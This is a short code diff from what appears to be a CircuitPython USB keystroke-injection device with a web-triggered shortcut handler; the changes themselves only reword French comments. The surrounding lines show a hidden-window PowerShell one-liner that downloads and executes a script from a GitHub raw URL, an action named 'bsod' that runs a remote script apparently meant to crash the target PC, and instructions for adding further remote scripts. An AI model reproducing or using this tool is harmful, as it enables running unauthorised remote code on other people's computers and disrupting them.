@@ -28,7 +28,7 @@ cc = ConsumerControl(usb_hid.devices)
 
 # ==============================================================
 # --- GITHUB ---------------------------------------------------
-# URL de base de ton repo (converti AZERTY BE)
+# URL de base du repo (converti AZERTY BE)
 # correspond a : https://raw.githubusercontent.com/IziPop/script/main/
 # powershell -w 1 -c "iex(irm https://raw.github.com/IziPop/script/main/[NOM].ps1)" 
 # ==============================================================
@@ -292,8 +292,8 @@ def shortcut(request: Request):
         kbd.send(Keycode.CAPS_LOCK)
     # --- SCRIPTS GITHUB ---
     # Pour ajouter un script :
-    # 1. Crée le .ps1 sur ton GitHub
-    # 2. Ajoute un elif ici avec run_github("nom_converti_azerty")
+    # 1. Crée le .ps1 sur le GitHub
+    # 2. Ajoute un elif ici avec run_github("nom_azerty")
     # 3. Ajoute un bouton dans le HTML
     elif action == "bsod":
         run_github("bsod")
